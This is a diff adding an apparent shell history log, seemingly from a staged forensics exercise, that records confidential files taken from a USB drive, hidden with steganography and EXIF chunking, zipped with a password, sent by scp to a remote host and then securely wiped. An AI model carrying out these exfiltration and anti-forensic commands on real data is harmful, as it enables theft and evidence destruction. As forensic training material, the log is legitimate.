@@ -1,0 +1,110 @@
+irssi
+mv ~/Downloads/hackedcredentials.txt ~/Documents
+xdg-open ~/Documents/hackedcredentials.txt
+rm ~/Desktop/TVShows/
+rm -r ~/Desktop/TVShows/
+ls
+cd Desktop/
+ls
+cd TVShows/
+ls
+cd ..
+cd stt
+ls
+nano doubleEncodingAndHidingInsideElf.py 
+source .venv/bin/activate
+python3 doubleEncodingAndHidingInsideElf.py 
+mv nmap ~/Desktop/TVShows/
+cd ~/Desktop/TVShows/
+ls
+strings nmap
+scp -r nmap ist90834@10.0.2.166
+scp -r nmap ist90834@10.0.2.166:~
+cd /media/johnnymusk/72B5-E8E1
+ls
+xdg-open blueprint.png 
+xdg-open BankStatement.pdf 
+cd ~/Documents/
+ks
+ls
+mkdir Ariane6
+cd /media/johnnymusk/72B5-E8E1/
+cp -r * ~/Documents/Ariane6/
+cd ~/Documents/Ariane6/
+ls
+rm -r System\ Volume\ Information/
+ls
+xdg-open api.pdf 
+xdg-open BankStatement.pdf 
+xdg-open blueprint.png 
+xdg-open Logs.txt 
+xdg-open Report.pdf 
+irssi
+cd Downloads/
+unzip EliteHackingTools-main.zip 
+ls
+mv EliteHackingTools-main ~/stt/
+cd ~
+cd stt
+ls
+cd EliteHackingTools-main/
+mv * ~/stt/
+ls
+cd ..
+ls
+rm EliteHackingTools-main
+rm -r EliteHackingTools-main
+source .venv/bin/activate
+python hide_pdf.py -h ~/Documents/Ariane6/BankStatement.pdf ~/Music/got.wav 
+sed 's/%PDF/%PNG/g' ~/Documents/Ariane6/api.pdf > ~/Documents/Ariane6/blank
+python converter.py -i ~/Documents/Ariane6/Logs.txt -o FileNotFound.txt
+strings FileNotFound.txt 
+python createChunks.py
+exiftool -Author= -GPSLongitude= -GPSLatitude= -GPSLatitudeRef= -GPSLongitudeRef= -SubSecDateTimeOriginal= -Title="Infinite Space" ~/Pictures/lactea.jpg
+exiftool -Author= -GPSLongitude= -GPSLatitude= -GPSLatitudeRef= -GPSLongitudeRef= -SubSecDateTimeOriginal= -Title="Infinite Space" ~/Pictures/andromeda.png
+exiftool -Author= -GPSLongitude= -GPSLatitude= -GPSLatitudeRef= -GPSLongitudeRef= -SubSecDateTimeOriginal= -Title="Infinite Space" ~/Pictures/cartwheel.tiff
+exiv2 -M "set Exif.Photo.UserComment '$(cat chunks/chunk_1.txt)'" ~/Pictures/lactea.jpg
+exiv2 -M "set Exif.Photo.UserComment '$(cat chunks/chunk_2.txt)'" ~/Pictures/andromeda.png
+exiv2 -M "set Exif.Photo.UserComment '$(cat chunks/chunk_3.txt)'" ~/Pictures/cartwheel.tiff
+cd stt
+sudo .venv/bin/python lsb.pyc -m hide -d horizontal -c rgb -n 3 -o ~/Pictures/wallpaper.png -p ~/Documents/Ariane6/Report.pdf -e pdf
+mv output/tagus.png output/wallpaper.png
+sudo chown johnnymusk output/wallpaper.png
+zip -j -P "zmaistangeptotlargelynaejotseda" "myzip.zip" ~/Pictures/got.jpg ~/Pictures/hd.jpg ~/Documents/Ariane6/blank output/wallpaper.png
+sudo .venv/bin/python lsb.pyc -m hide -d diagonaldown -c rgb -n 5 -o ~/Pictures/tagus.png -p ~/Documents/Ariane6/blueprint.png -e png
+sudo chown johnnymusk output/tagus.png
+scp -r Desktop/TVShows ist90834@10.0.2.166:~
+scp -r ~/Desktop/TVShows ist90834@10.0.2.166:~
+sudo apt-get install secure-delete
+ls
+cd ..
+cd ~
+cd Desktop/
+ls
+cd TVShows/
+ls
+srm -zvr *
+cd ..
+cd Documents/
+ls
+srm -zvr Ariane6/
+srm -zvr hackedcredentials.txt ist90834@10.0.2.166 
+cd ..
+cd Downloads/
+rm -rf EliteHackingTools-main.zip 
+cd ..
+cd Pictures/
+ls
+mv andromeda.png_original andromeda.png
+mv cartwheel.tiff_original cartwheel.tiff
+mv lactea.jpg_original lactea.jpg
+cd ..
+ls
+cd stt
+ls
+srm -zvr chunks/
+srm 
+srm base64.txt 
+srm -zvr FileNotFound.txt 
+scp -r /home/johnnymusk/Documents/thrones.pdf ist90834@10.0.2.166:~
+scp -r /home/johnnymusk/Documents/poster.pdf ist90834@10.0.2.166:~
